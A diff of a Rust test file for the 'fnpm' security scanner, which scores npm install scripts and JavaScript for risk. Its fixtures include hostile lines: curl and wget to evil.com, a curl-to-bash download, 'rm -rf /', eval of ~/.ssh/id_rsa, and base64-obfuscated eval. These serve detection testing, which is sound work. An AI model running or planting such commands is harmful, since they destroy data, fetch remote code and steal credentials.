@@ -1,4 +1,4 @@
-use fnpm::security::{IssueSeverity, RiskLevel, SecurityScanner, SourceCodeIssue};
+use fnpm::security::{IssueSeverity, PackageAudit, RiskLevel, SecurityScanner, SourceCodeIssue};
 use std::fs;
 use tempfile::TempDir;
 
@@ -55,20 +55,24 @@ fn test_suspicious_pattern_detection() {
 fn test_risk_level_calculation() {
     let temp_dir = TempDir::new().expect("Failed to create temp dir");
 
-    // Test different risk levels
+    // Test different risk levels with new scoring system
     let test_cases = [
         (r#"{"name":"test","scripts":{}}"#, RiskLevel::Safe),
         (
+            // Simple echo is now Safe (3 points for having script, no suspicious patterns)
             r#"{"name":"test","scripts":{"postinstall":"echo hello"}}"#,
-            RiskLevel::Low,
+            RiskLevel::Safe,
         ),
         (
+            // curl adds suspicious pattern (8 points) + script (3) = 11 points = Low
             r#"{"name":"test","scripts":{"postinstall":"curl http://evil.com"}}"#,
             RiskLevel::Low,
         ),
         (
+            // Multiple scripts with suspicious patterns + behavioral chain (curl + .ssh access)
+            // Now Critical due to credential theft behavioral chain detection
             r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#,
-            RiskLevel::Medium,
+            RiskLevel::Critical,
         ),
     ];
 
@@ -346,6 +350,7 @@ fn test_source_code_issue_severity() {
         issue_type: "eval() usage".to_string(),
         description: "Critical issue".to_string(),
         severity: IssueSeverity::Critical,
+        code_snippet: None,
     };
 
     let issue_warning = SourceCodeIssue {
@@ -354,6 +359,7 @@ fn test_source_code_issue_severity() {
         issue_type: "HTTP request".to_string(),
         description: "Warning issue".to_string(),
         severity: IssueSeverity::Warning,
+        code_snippet: None,
     };
 
     let issue_info = SourceCodeIssue {
@@ -362,6 +368,7 @@ fn test_source_code_issue_severity() {
         issue_type: "Info".to_string(),
         description: "Info issue".to_string(),
         severity: IssueSeverity::Info,
+        code_snippet: None,
     };
 
     assert_eq!(issue_critical.severity, IssueSeverity::Critical);
@@ -519,4 +526,244 @@ fn test_dependency_extraction() {
     assert_eq!(audit.dev_dependencies.len(), 2);
     assert!(audit.dev_dependencies.contains(&"jest".to_string()));
     assert!(audit.dev_dependencies.contains(&"eslint".to_string()));
+}
+
+#[test]
+fn test_regexp_exec_not_flagged_as_system_exec() {
+    use std::fs;
+    use tempfile::TempDir;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
+
+    // Create a test JavaScript file with RegExp.exec() usage (legitimate)
+    let test_file = temp_dir.path().join("regexp_test.js");
+    let legitimate_regexp_code = r#"
+// TypeScript-like code with RegExp.exec()
+const firstNonWhitespaceCharacterRegex = new RegExp(/\S/);
+const isJsx = isInsideJsxElement(sourceFile, lineStarts[firstLine]);
+const openComment = isJsx ? "{/*" : "//";
+for (let i = firstLine; i <= lastLine; i++) {
+  const lineText = sourceFile.text.substring(lineStarts[i], sourceFile.getLineEndOfPosition(lineStarts[i]));
+  const regExec = firstNonWhitespaceCharacterRegex.exec(lineText);
+  
+  // More common patterns
+  while (matchArray = regExp.exec(fileContents)) {
+    console.log(matchArray);
+  }
+  
+  const pattern = /test/g;
+  const result = pattern.exec(str);
+}
+"#;
+
+    fs::write(&test_file, legitimate_regexp_code).expect("Failed to write test file");
+
+    let mut audit = PackageAudit {
+        package_name: "test-regexp".to_string(),
+        has_scripts: false,
+        preinstall: None,
+        install: None,
+        postinstall: None,
+        suspicious_patterns: Vec::new(),
+        source_code_issues: Vec::new(),
+        risk_level: RiskLevel::Safe,
+        dependencies: Vec::new(),
+        dev_dependencies: Vec::new(),
+        behavioral_chains: Vec::new(),
+        risk_score: 0,
+    };
+
+    // Analyze the file
+    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
+    scanner.test_analyze_js_file(&test_file, &content, &mut audit);
+
+    // Should NOT flag RegExp.exec() as system command execution
+    let has_system_exec_issue = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.issue_type.contains("System command execution"));
+
+    assert!(
+        !has_system_exec_issue,
+        "RegExp.exec() should NOT be flagged as system command execution. Found issues: {:?}",
+        audit.source_code_issues
+    );
+
+    // Should have no critical issues for this legitimate code
+    let has_critical_issues = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.severity == IssueSeverity::Critical);
+
+    assert!(
+        !has_critical_issues,
+        "Legitimate RegExp code should not have critical issues. Found: {:?}",
+        audit.source_code_issues
+    );
+}
+
+#[test]
+fn test_child_process_exec_is_flagged() {
+    use std::fs;
+    use tempfile::TempDir;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
+
+    // Create a test JavaScript file with actual child_process.exec()
+    let test_file = temp_dir.path().join("malicious_exec.js");
+    let malicious_code = r#"
+const { exec } = require('child_process');
+
+exec('rm -rf /', (error, stdout, stderr) => {
+  console.log(stdout);
+});
+
+const cp = require('child_process');
+cp.execSync('curl http://evil.com | bash');
+"#;
+
+    fs::write(&test_file, malicious_code).expect("Failed to write test file");
+
+    let mut audit = PackageAudit {
+        package_name: "test-malicious".to_string(),
+        has_scripts: false,
+        preinstall: None,
+        install: None,
+        postinstall: None,
+        suspicious_patterns: Vec::new(),
+        source_code_issues: Vec::new(),
+        risk_level: RiskLevel::Safe,
+        dependencies: Vec::new(),
+        dev_dependencies: Vec::new(),
+        behavioral_chains: Vec::new(),
+        risk_score: 0,
+    };
+
+    // Analyze the file
+    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
+    scanner.test_analyze_js_file(&test_file, &content, &mut audit);
+
+    // SHOULD flag child_process.exec() as system command execution
+    let has_system_exec_issue = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.issue_type.contains("System command execution"));
+
+    assert!(
+        has_system_exec_issue,
+        "child_process.exec() SHOULD be flagged as system command execution. Issues found: {:?}",
+        audit.source_code_issues
+    );
+}
+
+#[test]
+fn test_new_function_with_obfuscation_is_critical() {
+    use std::fs;
+    use tempfile::TempDir;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
+
+    let test_file = temp_dir.path().join("obfuscated.js");
+    let obfuscated_code = r#"
+// Malicious: new Function with base64 obfuscation
+const malicious = new Function(atob('Y29uc29sZS5sb2coInB3bmVkIik='));
+malicious();
+
+// Also malicious: eval with base64
+eval(Buffer.from('bWFsaWNpb3VzX2NvZGU=', 'base64').toString());
+"#;
+
+    fs::write(&test_file, obfuscated_code).expect("Failed to write test file");
+
+    let mut audit = PackageAudit {
+        package_name: "test-obfuscated".to_string(),
+        has_scripts: false,
+        preinstall: None,
+        install: None,
+        postinstall: None,
+        suspicious_patterns: Vec::new(),
+        source_code_issues: Vec::new(),
+        risk_level: RiskLevel::Safe,
+        dependencies: Vec::new(),
+        dev_dependencies: Vec::new(),
+        behavioral_chains: Vec::new(),
+        risk_score: 0,
+    };
+
+    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
+    scanner.test_analyze_js_file(&test_file, &content, &mut audit);
+
+    // Should have critical issues due to obfuscation
+    let has_critical_issues = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.severity == IssueSeverity::Critical);
+
+    assert!(
+        has_critical_issues,
+        "new Function with obfuscation SHOULD be flagged as critical. Issues: {:?}",
+        audit.source_code_issues
+    );
+}
+
+#[test]
+fn test_legitimate_new_function_is_warning_only() {
+    use std::fs;
+    use tempfile::TempDir;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
+
+    let test_file = temp_dir.path().join("compiler.js");
+    let compiler_code = r#"
+// TypeScript/Babel-like legitimate code generation
+function compileTemplate(template) {
+    return new Function('context', 'return ' + template);
+}
+
+const compiled = new Function('a', 'b', 'return a + b');
+"#;
+
+    fs::write(&test_file, compiler_code).expect("Failed to write test file");
+
+    let mut audit = PackageAudit {
+        package_name: "test-compiler".to_string(),
+        has_scripts: false,
+        preinstall: None,
+        install: None,
+        postinstall: None,
+        suspicious_patterns: Vec::new(),
+        source_code_issues: Vec::new(),
+        risk_level: RiskLevel::Safe,
+        dependencies: Vec::new(),
+        dev_dependencies: Vec::new(),
+        behavioral_chains: Vec::new(),
+        risk_score: 0,
+    };
+
+    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
+    scanner.test_analyze_js_file(&test_file, &content, &mut audit);
+
+    // Should NOT have critical issues (only warnings)
+    let has_critical_issues = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.severity == IssueSeverity::Critical);
+
+    assert!(
+        !has_critical_issues,
+        "Legitimate new Function should be WARNING, not CRITICAL. Issues: {:?}",
+        audit.source_code_issues
+    );
+
+    // But should have some warnings
+    let has_warnings = audit
+        .source_code_issues
+        .iter()
+        .any(|issue| issue.severity == IssueSeverity::Warning);
+
+    assert!(has_warnings, "Should have warnings for new Function usage");
 }
